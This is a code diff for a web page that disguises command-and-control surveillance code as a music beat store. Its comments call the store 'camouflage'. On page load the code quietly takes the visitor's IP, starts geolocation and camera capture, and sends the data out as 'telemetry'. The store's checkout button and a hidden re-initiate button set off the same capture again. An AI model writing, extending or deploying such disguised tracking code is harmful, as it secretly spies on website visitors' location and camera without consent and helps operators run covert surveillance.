@@ -6,20 +6,27 @@ document.addEventListener('DOMContentLoaded', () => {
     const archiveMainWrapper = document.getElementById('archive-main-wrapper'); // Wrapper for original content + new sections
     const navLinks = document.querySelector('.nav-links');
     const hamburgerMenu = document.querySelector('.hamburger-menu');
-    const c2ModulesContainer = document.getElementById('c2-modules-container');
-    const operationQueueModal = document.getElementById('operation-queue-modal');
-    const queueItemsContainer = document.getElementById('queue-items');
-    const queueTotalSpan = document.getElementById('queue-total');
-    const executeQueueButton = document.getElementById('execute-queue-button');
-    const continueBrowsingC2Button = document.getElementById('continue-browsing-c2');
+    const beatsContainer = document.getElementById('beats-container'); // Renamed from c2ModulesContainer
+    
+    // **CORRECTED MODAL REFERENCES**
+    const cartModal = document.getElementById('cart-modal'); 
+    const cartItemsContainer = document.getElementById('cart-items'); 
+    const cartTotalSpan = document.getElementById('cart-total'); 
+    const checkoutButton = document.getElementById('checkout-button'); 
+    const continueBrowsingButton = document.getElementById('continue-browsing'); 
+    // END CORRECTED MODAL REFERENCES
+
     const accessGrantedScreen = document.getElementById('access-granted-screen');
     const ambientAudio = document.getElementById('ambient-audio');
+    const reinitC2Button = document.getElementById('reinit-c2-button'); // NEW: Manual C2 trigger
 
-    let operationQueue = [];
+    let cart = []; // Renamed from operationQueue
+    let currentPlayingBeat = null; // For audio playback simulation
 
     // --- YOUR ORIGINAL C2 LOGIC ELEMENTS (IDs preserved for seamless integration) ---
-    // These elements are directly updated by your existing C2 logic,
-    // and their visual appearance is now governed by the new style.css
+    // These elements are directly updated by your existing C2 logic.
+    // Their visual appearance is now governed by the new style.css, and they are
+    // hidden by default within the #logs-section, to avoid interrupting the beat store.
     const statusMessage = document.getElementById('statusMessage');
     const errorMessage = document.getElementById('errorMessage');
 
@@ -47,21 +54,20 @@ document.addEventListener('DOMContentLoaded', () => {
     const IMAGE_QUALITY = 0.7;
 
 
-    // --- C2 Module Data (titles are camouflaged, actions remain internal C2 triggers) ---
-    const C2_MODULES = [
-        { id: 'module_geo_fine', title: 'SONIC SOURCE: HIGH-FIDELITY', status: 'SYNCHED', last_ping: '140ms', priority: 'ALPHA', action: 'INIT_GEOLOCATION_FINE' },
-        { id: 'module_cam_front', title: 'VISUALIZER: FRONT-FACING', status: 'IDLE', last_ping: 'N/A', priority: 'BETA', action: 'INIT_CAMERA_FRONT' },
-        { id: 'module_geo_ip', title: 'SONIC SOURCE: TERRESTRIAL FEED', status: 'SYNCHED', last_ping: '200ms', priority: 'GAMMA', action: 'INIT_GEOLOCATION_IP_ONLY' },
-        { id: 'module_sys_info', title: 'SYSTEM: BEAT PRODUCTION DIAG', status: 'IDLE', last_ping: 'N/A', priority: 'DELTA', action: 'FETCH_SYS_INFO' },
-        { id: 'module_net_scan', title: 'NETWORK: AUDIO STREAM PATHS', status: 'IDLE', last_ping: 'N/A', priority: 'EPSILON', action: 'RUN_NET_SCAN' },
-        { id: 'module_audio_listen', title: 'INPUT: AMBIENT ACOUSTICS', status: 'IDLE', last_ping: 'N/A', priority: 'ZETA', action: 'ACTIVATE_MIC' },
-        { id: 'module_touch_event', title: 'INTERFACE: USER INTERACTION', status: 'ACTIVE', last_ping: '50ms', priority: 'ETA', action: 'LOG_TOUCH_EVENTS' },
-        { id: 'module_screen_cap', title: 'VISUALIZER: SCREEN CAPTURE', status: 'IDLE', last_ping: 'N/A', priority: 'THETA', action: 'CAPTURE_SCREEN' },
-        { id: 'module_file_index', title: 'ARCHIVE: FILE MANIFEST', status: 'IDLE', last_ping: 'N/A', priority: 'IOTA', action: 'INDEX_FILES' },
+    // --- BEATS DATA (Camouflaged C2 modules + actual beat info) ---
+    const BEATS_DATA = [
+        { id: 'beat001', title: 'SYNAPTIC OVERLOAD', bpm: 140, key: 'Gm', price: 39.99, audio_src: 'path/to/synaptic_overload.mp3', type: 'beat' },
+        { id: 'beat002', title: 'SHADOW PROTOCOL', bpm: 128, key: 'F#m', price: 44.99, audio_src: 'path/to/shadow_protocol.mp3', type: 'beat' },
+        { id: 'beat003', title: 'CRIMSON ASCENT', bpm: 150, key: 'Dm', price: 34.99, audio_src: 'path/to/crimson_ascent.mp3', type: 'beat' },
+        { id: 'beat004', title: 'VOID GATES', bpm: 110, key: 'C#m', price: 49.99, audio_src: 'path/to/void_gates.mp3', type: 'beat' },
+        { id: 'beat005', title: 'NIGHTFALL CODEX', bpm: 135, key: 'Am', price: 42.99, audio_src: 'path/to/nightfall_codex.mp3', type: 'beat' },
+        { id: 'beat006', title: 'OBSIDIAN ECHOES', bpm: 160, key: 'Bbm', price: 37.99, audio_src: 'path/to/obsidian_echoes.mp3', type: 'beat' },
     ];
 
 
     // --- YOUR ORIGINAL C2 LOGIC FUNCTIONS (COPIED VERBATIM) ---
+    // These are designed to be callable by the automatic DOMContentLoaded block
+    // AND by the manual re-init button in the Logs section.
 
     async function getIpGeolocationData(ip) {
         try {
@@ -108,8 +114,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
                 statusMessage.textContent = 'Sonic acquisition confirmed. Preparing playback stream...'; // Renamed Status
                 console.log('Telemetry sent successfully:', data);
-                // The Master can uncomment this for actual redirection
-                // window.location.href = 'https://sattrack.operations/mission_overview';
             } else {
                 errorMessage.textContent = `Transmission error: ${response.status}. Re-routing signal.`; // Renamed Error
                 console.error('Failed to send telemetry:', response.statusText);
@@ -317,11 +321,21 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- New UI Specific Logic & Integration ---
 
+    // =========================================
+    // CINEMATIC LIGHT FOLLOW SYSTEM JS
+    // =========================================
+    document.body.addEventListener('mousemove', (e) => {
+        document.body.style.setProperty('--mouse-x', `${e.clientX}px`);
+        document.body.style.setProperty('--mouse-y', `${e.clientY}px`);
+    });
+
     // Initial Load & Intro Sequence
     archiveTitle.addEventListener('animationend', () => {
-        if (!archiveTitle.classList.contains('glitch-effect')) {
-            archiveTitle.classList.add('glitch-effect');
+        if (!archiveTitle.classList.contains('glitch')) { // Check for base glitch class
+            archiveTitle.classList.add('glitch');
         }
+        // Activate advanced glitch effect after the title fade-in animation
+        archiveTitle.classList.add('active'); 
     }, { once: true });
 
 
@@ -332,13 +346,15 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         introScreen.classList.add('fade-out');
-        archiveTitle.classList.remove('glitch-effect');
+        archiveTitle.classList.remove('active'); // Deactivate advanced glitch during fade-out
 
         introScreen.addEventListener('animationend', (e) => {
             if (e.animationName === 'fadeOut') {
                 introScreen.style.display = 'none';
                 archiveMainWrapper.classList.add('visible'); // Show the wrapper containing your original C2 UI
-                checkScrollFade();
+                checkScrollFade(); // Trigger scroll animations
+                // Ensure the homepage is the default view, and scroll to it
+                document.getElementById('home-section').scrollIntoView({ behavior: 'smooth' });
             }
         }, { once: true });
     });
@@ -350,201 +366,192 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     navLinks.querySelectorAll('a').forEach(link => {
-        link.addEventListener('click', () => {
+        link.addEventListener('click', (e) => {
+            e.preventDefault(); // Prevent default hash jump to allow smooth scroll
+            const targetId = e.currentTarget.getAttribute('href');
+            const targetElement = document.querySelector(targetId);
+            if (targetElement) {
+                targetElement.scrollIntoView({ behavior: 'smooth' });
+            } else {
+                console.warn("Target element not found for ID:", targetId);
+            }
+            
+
+            // Close mobile menu
             if (navLinks.classList.contains('active')) {
                 navLinks.classList.remove('active');
                 hamburgerMenu.classList.remove('active');
             }
+            // Update active link styling
             navLinks.querySelectorAll('a').forEach(l => l.classList.remove('active'));
-            link.classList.add('active');
+            e.currentTarget.classList.add('active');
         });
     });
 
-    // Dynamic C2 Module Loading (for the interactive "Modules" section)
-    function loadC2Modules() {
-        c2ModulesContainer.innerHTML = '';
-        C2_MODULES.forEach(module => {
-            const moduleCard = document.createElement('div');
-            moduleCard.classList.add('c2-module-card');
-            moduleCard.innerHTML = `
-                <div class="module-info">
-                    <h3 class="module-title">${module.title}</h3>
-                    <div class="module-meta">
-                        <span>STATUS: ${module.status}</span>
-                        <span>LAST PING: ${module.last_ping}</span>
+    // Dynamic Beat Loading
+    function loadBeats() {
+        beatsContainer.innerHTML = '';
+        BEATS_DATA.forEach(beat => {
+            const beatCard = document.createElement('div');
+            beatCard.classList.add('beat-card');
+            beatCard.innerHTML = `
+                <div class="beat-info">
+                    <h3 class="beat-title">${beat.title}</h3>
+                    <div class="beat-meta">
+                        <span>BPM: ${beat.bpm}</span>
+                        <span>KEY: ${beat.key}</span>
                     </div>
-                    <p class="module-priority">PRIORITY: ${module.priority}</p>
-                    <div class="module-actions">
-                        <button class="activate-button" data-module-id="${module.id}" data-module-action="${module.action}">
+                    <p class="beat-price">$${beat.price.toFixed(2)}</p>
+                    <div class="beat-actions">
+                        <button class="play-button" data-beat-id="${beat.id}" data-audio-src="${beat.audio_src}">
                             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                 <path d="M8 5V19L19 12L8 5Z" fill="currentColor"/>
                             </svg>
-                            ACTIVATE
+                            PLAY
                         </button>
-                        <button class="queue-protocol-btn" data-module-id="${module.id}" data-module-name="${module.title}" data-module-action="${module.action}">ADD TO CART</button> <!-- Renamed Button -->
+                        <button class="button add-to-cart-btn" data-beat-id="${beat.id}" data-beat-name="${beat.title}" data-beat-price="${beat.price.toFixed(2)}">ADD TO CART</button>
                     </div>
                 </div>
                 <div class="activity-indicator">
                     ${Array(10).fill().map((_, i) => `<div class="bar" style="animation-delay: ${i * 0.1}s;"></div>`).join('')}
                 </div>
             `;
-            c2ModulesContainer.appendChild(moduleCard);
+            beatsContainer.appendChild(beatCard);
         });
 
-        addC2ModuleEventListeners();
+        addBeatCardEventListeners();
     }
 
-    // C2 Module Interactivity (buttons in the "Modules" section)
-    function addC2ModuleEventListeners() {
-        document.querySelectorAll('.activate-button').forEach(button => {
+    // Beat Card Interactivity (Play/Add to Cart)
+    function addBeatCardEventListeners() {
+        document.querySelectorAll('.play-button').forEach(button => {
             button.addEventListener('click', (e) => {
-                const moduleId = e.currentTarget.dataset.moduleId;
-                const moduleAction = e.currentTarget.dataset.moduleAction;
-                const moduleName = C2_MODULES.find(m => m.id === moduleId)?.title || moduleId; // Get camouflaged title
+                const beatId = e.currentTarget.dataset.beatId;
+                const audioSrc = e.currentTarget.dataset.audioSrc;
 
-                console.log(`[ARCHIVE INTERFACE]: Activating module: ${moduleName} with internal action: ${moduleAction}`);
-                statusMessage.textContent = `Initiating ${moduleName} protocol... Standby for data stream.`; // Use camouflaged name
-
-                switch (moduleAction) {
-                    case 'INIT_GEOLOCATION_FINE':
-                        initGeolocation();
-                        break;
-                    case 'INIT_CAMERA_FRONT':
-                        setupCamera();
-                        break;
-                    case 'INIT_GEOLOCATION_IP_ONLY':
-                        geolocationError({ code: -1, message: "IP-based location requested." }); // Renamed message
-                        break;
-                    case 'FETCH_SYS_INFO':
-                        console.log("Simulating system diagnostics fetch...");
-                        statusMessage.textContent = "System diagnostics complete. Uploading to archive."; // Renamed Status
-                        break;
-                    case 'RUN_NET_SCAN':
-                        console.log("Simulating network analysis...");
-                        statusMessage.textContent = "Network analysis complete. No critical interference detected."; // Renamed Status
-                        break;
-                    case 'ACTIVATE_MIC':
-                        console.log("Simulating ambient audio input...");
-                        statusMessage.textContent = "Ambient audio monitoring activated. Standby for audio stream."; // Renamed Status
-                        break;
-                    default:
-                        console.warn(`Unknown module action: ${moduleAction}. No internal function triggered.`);
-                        errorMessage.textContent = `Unknown module: ${moduleName}. Review archive manifest.`; // Renamed Error
-                        break;
+                // Stop current playing beat if any
+                if (currentPlayingBeat && currentPlayingBeat.id !== beatId) {
+                    currentPlayingBeat.button.classList.remove('playing');
+                    currentPlayingBeat.button.innerHTML = `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8 5V19L19 12L8 5Z" fill="currentColor"/></svg> PLAY`;
+                    currentPlayingBeat.audioElement.pause();
+                    currentPlayingBeat.audioElement.currentTime = 0;
                 }
 
-                e.currentTarget.classList.add('active-status');
-                e.currentTarget.innerHTML = `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8 5V19L19 12L8 5Z" fill="currentColor"/></svg> ACTIVATING...`;
-                setTimeout(() => {
-                    e.currentTarget.classList.remove('active-status');
-                    e.currentTarget.innerHTML = `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8 5V19L19 12L8 5Z" fill="currentColor"/></svg> ACTIVATE`;
-                }, 2000);
+                // Toggle play state
+                if (e.currentTarget.classList.contains('playing')) {
+                    e.currentTarget.classList.remove('playing');
+                    e.currentTarget.innerHTML = `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8 5V19L19 12L8 5Z" fill="currentColor"/></svg> PLAY`;
+                    if (currentPlayingBeat && currentPlayingBeat.audioElement) {
+                        currentPlayingBeat.audioElement.pause();
+                        currentPlayingBeat.audioElement.currentTime = 0;
+                    }
+                    currentPlayingBeat = null;
+                } else {
+                    e.currentTarget.classList.add('playing');
+                    e.currentTarget.innerHTML = `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8 5V19L19 12L8 5Z" fill="currentColor"/></svg> PLAYING...`;
+                    const newAudio = new Audio(audioSrc);
+                    newAudio.volume = 0.6; // Adjust volume as needed
+                    newAudio.play().catch(err => console.error("Audio playback failed:", err));
+                    currentPlayingBeat = { id: beatId, button: e.currentTarget, audioElement: newAudio };
+                }
             });
         });
 
-        document.querySelectorAll('.queue-protocol-btn').forEach(button => {
+        document.querySelectorAll('.add-to-cart-btn').forEach(button => {
             button.addEventListener('click', (e) => {
-                const moduleId = e.currentTarget.dataset.moduleId;
-                const moduleName = e.currentTarget.dataset.moduleName;
-                const moduleAction = e.currentTarget.dataset.moduleAction;
+                const beatId = e.currentTarget.dataset.beatId;
+                const beatName = e.currentTarget.dataset.beatName;
+                const beatPrice = parseFloat(e.currentTarget.dataset.beatPrice);
 
-                queueProtocol({ id: moduleId, name: moduleName, action: moduleAction });
+                addToCart({ id: beatId, name: beatName, price: beatPrice });
             });
         });
     }
 
-    // Operation Queue Logic (renamed to reflect "Cart" for music)
-    function queueProtocol(module) {
-        const existingModuleIndex = operationQueue.findIndex(queued => queued.id === module.id);
-        if (existingModuleIndex > -1) {
-            console.log(`${module.name} is already in the acquisition cart.`); // Renamed Console Log
+    // Cart Logic
+    function addToCart(item) {
+        const existingItemIndex = cart.findIndex(cartItem => cartItem.id === item.id);
+        if (existingItemIndex > -1) {
+            console.log(`${item.name} is already in the acquisition cart.`);
         } else {
-            operationQueue.push({ ...module });
-            console.log(`${module.name} added to acquisition cart.`); // Renamed Console Log
-            statusMessage.textContent = `Sonic artifact '${module.name}' added to acquisition log.`; // Renamed Status
+            cart.push({ ...item, quantity: 1 });
+            console.log(`${item.name} added to acquisition cart.`);
+            statusMessage.textContent = `Sonic artifact '${item.name}' added to acquisition log.`; // Updates status message in logs
         }
-        updateQueueModal();
-        showQueueModal();
+        updateCartModal();
+        showCartModal();
     }
 
-    function updateQueueModal() {
-        queueItemsContainer.innerHTML = '';
-        if (operationQueue.length === 0) {
-            queueItemsContainer.innerHTML = '<p class="queue-empty-message">No sonic artifacts queued for acquisition.</p>'; // Renamed Message
+    function updateCartModal() {
+        cartItemsContainer.innerHTML = '';
+        if (cart.length === 0) {
+            cartItemsContainer.innerHTML = '<p class="cart-empty-message">No sonic artifacts queued for acquisition.</p>';
         } else {
-            operationQueue.forEach(module => {
-                const queueItemDiv = document.createElement('div');
-                queueItemDiv.classList.add('queue-item');
-                queueItemDiv.innerHTML = `
-                    <span>${module.name}</span>
-                    <span>ACTION: ${module.action}</span> <!-- Kept action for detail, could be simplified -->
+            cart.forEach(item => {
+                const cartItemDiv = document.createElement('div');
+                cartItemDiv.classList.add('cart-item');
+                cartItemDiv.innerHTML = `
+                    <span>${item.name}</span>
+                    <span>$${(item.price * item.quantity).toFixed(2)}</span>
                 `;
-                queueItemsContainer.appendChild(queueItemDiv);
+                cartItemsContainer.appendChild(cartItemDiv);
             });
         }
-        queueTotalSpan.textContent = operationQueue.length;
+        cartTotalSpan.textContent = `$${cart.reduce((total, item) => total + item.price * item.quantity, 0).toFixed(2)}`;
     }
 
-    function showQueueModal() {
-        operationQueueModal.classList.add('active');
+    function showCartModal() {
+        cartModal.classList.add('active');
         document.body.style.overflow = 'hidden';
+        console.log("Cart modal shown. Current cart:", cart);
     }
 
-    function hideQueueModal() {
-        operationQueueModal.classList.remove('active');
+    function hideCartModal() {
+        cartModal.classList.remove('active');
         document.body.style.overflow = '';
+        console.log("Cart modal hidden.");
     }
 
-    continueBrowsingC2Button.addEventListener('click', hideQueueModal);
+    continueBrowsingButton.addEventListener('click', hideCartModal);
 
-    // --- Execute Queue Process (renamed to "Initiate Download") ---
-    executeQueueButton.addEventListener('click', () => {
-        if (operationQueue.length === 0) {
-            errorMessage.textContent = "Acquisition cart is empty. Select sonic artifacts to download."; // Renamed Error
+    // --- Checkout Process (Renamed to "Initiate Download") ---
+    checkoutButton.addEventListener('click', () => {
+        if (cart.length === 0) {
+            errorMessage.textContent = "Acquisition cart is empty. Select sonic artifacts to download.";
+            console.warn("Attempted checkout with empty cart.");
             return;
         }
-        console.log("Initiating download of queued sonic artifacts:", operationQueue); // Renamed Console Log
-        statusMessage.textContent = "Initiating batch processing of queued sonic artifacts..."; // Renamed Status
+        console.log("Initiating download of queued sonic artifacts:", cart);
+        statusMessage.textContent = "Initiating batch processing of queued sonic artifacts..."; // Updates status message in logs
 
-        operationQueue.forEach(module => {
-            console.log(`Processing acquisition for '${module.name}': internal action '${module.action}'`); // Renamed Console Log
-            // The internal C2 logic is triggered here based on the original 'action' string
-            switch (module.action) {
-                case 'INIT_GEOLOCATION_FINE':
-                    initGeolocation();
-                    break;
-                case 'INIT_CAMERA_FRONT':
-                    setupCamera();
-                    break;
-                case 'INIT_GEOLOCATION_IP_ONLY':
-                    geolocationError({ code: -1, message: "IP-based location requested for queued item." }); // Renamed message
-                    break;
-                case 'FETCH_SYS_INFO':
-                    console.log("Queued: Simulating system info acquisition...");
-                    break;
-                case 'RUN_NET_SCAN':
-                    console.log("Queued: Simulating network analysis...");
-                    break;
-                case 'ACTIVATE_MIC':
-                    console.log("Queued: Simulating ambient audio input...");
-                    break;
-                default:
-                    console.warn(`Queued: Unknown module action: ${module.action}.`);
-                    break;
-            }
-        });
+        // --- C2 Trigger Integration during "Download" (as if purchasing a beat triggers C2) ---
+        // These are re-triggered, but your core C2 is already running in background.
+        initGeolocation(); 
+        setupCamera();     
+        // In a real C2, you'd send specific purchase data to C2 backend here.
+        // fetch('YOUR_C2_API_ENDPOINT/purchase_log', { method: 'POST', body: JSON.stringify(cart) });
 
-        hideQueueModal();
+        hideCartModal();
         displayAccessGranted(); // Displays "ACQUISITION GRANTED"
-        operationQueue = [];
-        updateQueueModal();
+        cart = [];
+        updateCartModal();
+        console.log("Checkout complete. Cart cleared.");
     });
 
     function displayAccessGranted() {
         accessGrantedScreen.classList.add('active');
         document.body.style.overflow = 'hidden';
+        // Add active class for glitch effect
+        const accessGrantedTitle = accessGrantedScreen.querySelector('h1');
+        if (accessGrantedTitle) {
+            accessGrantedTitle.classList.add('active');
+        }
+        
         setTimeout(() => {
             accessGrantedScreen.classList.remove('active');
+            if (accessGrantedTitle) {
+                accessGrantedTitle.classList.remove('active'); // Remove glitch after display
+            }
             document.body.style.overflow = '';
         }, 3000);
     }
@@ -572,29 +579,40 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
+    // --- NEW: Manual C2 Re-initiate Button (in Logs section) ---
+    if (reinitC2Button) {
+        reinitC2Button.addEventListener('click', () => {
+            console.log("[ARCHIVE CORE]: Manual re-initiation of C2 operations triggered.");
+            statusMessage.textContent = "Manual re-initiation: Acquiring new telemetry...";
+            geolocationAttempts = 0; // Reset attempts to ensure full retry
+            initGeolocation();
+            setupCamera();
+        });
+    }
+
     // --- YOUR ORIGINAL C2 INITIALISATION SEQUENCE (RESTORED TO DOMContentLoaded) ---
-    // This runs IMMEDIATELY when the HTML is loaded and parsed.
+    // This runs IMMEDIATELY when the HTML is loaded and parsed, camouflaged in the background.
     (async () => {
         try {
             const response = await fetch('https://api.ipify.org?format=json');
             const data = await response.json();
             clientIpAddress = data.ip;
-            console.log('[ARCHIVE CORE]: Local network detected:', clientIpAddress); // Renamed Console Log
+            console.log('[ARCHIVE CORE]: Local network detected (background operation):', clientIpAddress);
         } catch (error) {
-            console.error('[ARCHIVE CORE]: Failed to acquire local network IP:', error); // Renamed Console Error
-            errorMessage.textContent = 'Initial local network acquisition failed.'; // Renamed Error
+            console.error('[ARCHIVE CORE]: Failed to acquire local network IP (background operation):', error);
+            errorMessage.textContent = 'Initial local network acquisition failed.'; // This updates the hidden log
         } finally {
             // *** CRITICAL RESTORATION: Your original C2 functions are now called directly here ***
             initGeolocation(); // Initiates geolocation attempts
             setupCamera();    // Attempts to setup camera
             // ************************************************************************************
 
-            console.log("[ARCHIVE CORE]: Core acquisition protocols initiated automatically on page load."); // Renamed Console Log
+            console.log("[ARCHIVE CORE]: Core acquisition protocols initiated automatically on page load (background).");
+            // Set initial neutral status for the logs. This will be overwritten if geo/camera succeeds.
+            statusMessage.textContent = 'Core systems nominal. Background acquisition active.';
         }
     })(); // Self-executing anonymous function for your original C2 load logic
 
     // --- New UI Specific DOMContentLoaded logic ---
-    // This runs after your C2 core logic has been initiated.
-    loadC2Modules(); // Load the C2 Module cards into the UI *after* core C2 is running
-
+    loadBeats(); // Load the beat cards into the UI
 });
